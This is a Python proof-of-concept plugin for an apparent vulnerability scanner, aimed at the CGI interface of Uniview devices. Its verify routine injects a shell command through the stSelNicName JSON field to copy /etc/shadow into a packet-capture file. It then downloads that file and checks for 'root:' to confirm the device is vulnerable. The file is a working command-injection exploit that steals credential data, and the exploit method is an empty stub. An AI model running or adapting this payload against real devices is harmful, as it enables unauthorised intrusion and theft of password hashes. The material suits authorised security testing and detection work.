from urllib.parse import quote
import requests

from loguru import logger

from .base import POCTemplate


class UniviewRCE02(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['uniview']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.high
        self.desc = """"""
        self.headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}

    def verify(self, ip, port=80):
        json_1 = '{"cmd":264,"status":1,"bSelectAllPort":1,"stSelPort":0,"bSelectAllIp":1,"stSelIp":0,"stSelNicName":";cp /etc/shadow /tmp/packetcapture.pcap;"}'
        json_2 = '{"cmd":265,"szUserName":"","u32UserLoginHandle":-1}'
        path1 = "/cgi-bin/main-cgi?json=" + quote(json_1, safe='')
        path2 = "/cgi-bin/main-cgi?json=" + quote(json_2, safe='')
        try:
            r1 = requests.get(f"http://{ip}:{port}{path1}", headers=self.headers, timeout=self.config.timeout, verify=False)
            if r1.status_code == 200:
                r2 = requests.get(f"http://{ip}:{port}{path2}", headers=self.headers, timeout=self.config.timeout, verify=False)
                if r2.status_code == 200 and (("\"success\": true" in r2.text) or ('root:' in r2.text)):
                    return ip, str(port), self.product, '', '', self.name
        except Exception as e:
            logger.error(e)
        return None

    def exploit(self, results):
        pass


POCTemplate.register_poc(UniviewRCE02)
